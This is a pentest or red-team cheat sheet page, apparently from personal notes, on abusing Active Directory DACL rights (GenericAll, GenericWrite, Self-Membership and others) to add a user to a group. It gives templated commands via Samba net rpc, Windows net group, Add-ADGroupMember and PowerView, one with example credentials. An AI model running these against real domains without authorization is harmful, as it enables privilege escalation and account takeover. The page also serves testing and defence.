---
Primary_category: "[[DACL ABUSE]]"
title: "[[ADDMEMBER]]"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[DACL ABUSE]]

An operator can abuse this *DACL* when the controlled user account has **`GenericAll`**, **`GenericWrite`**, **`Self`**, **`AllExtendedRights`** or **`Self-Membership`** over the target group

---

#### *Abuse - UNIX-like*

##### *Net RPC (Samba Suite)*

> ***[Net RPC]()***

```bash
net rpc group addmem '<GROUP>' '<USER>' -U '<DOMAIN>/<USER>%<PASSWD>' -S '<TARGET>'
```

> [!DANGER]- *e.g.*
>
> *User A* leverages *GenericWrite* over *Group A* to add *User B* to *Group A*
>
> ```bash
> net rpc group addmem 'Group A' 'userB' 'domain.local/userA%password1234$!' -S 'dc.domain.local'
> ```
>

---

#### *Abuse - Windows*

##### *Net Command*

> ***[Net](https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/net-commands-on-operating-systems)***

```bash
net group /domain /add '<GROUP>' '<USER>'
```

##### *AD Powershell Module*

> ***[AD PS Module](https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2025-ps)***

```bash
Add-ADGroupMember -Identity '<GROUP>' -Members '<USER>'
```

##### *Powerview*

> ***[Powerview.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)***

> ***Add-DomainGroupMember***

```powershell
$pass = ConvertTo-SecureString -AsPlainText -Force -String '<PASSWD>'
```

```powershell
$cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>,', $pass)
```

```powershell
Add-DomainGroupMember -Credential $cred -Identity '<GROUP>' -Members '<USER>' -Verbose
```